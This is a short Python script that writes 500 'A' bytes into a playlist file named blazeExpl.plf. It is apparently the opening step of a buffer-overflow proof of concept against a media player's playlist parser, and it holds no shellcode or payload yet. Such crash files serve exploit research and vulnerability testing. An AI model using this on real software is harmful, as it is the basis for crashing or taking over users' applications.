junk ="\x41"*500 
x=open('blazeExpl.plf', 'w')
x.write(junk)
x.close()
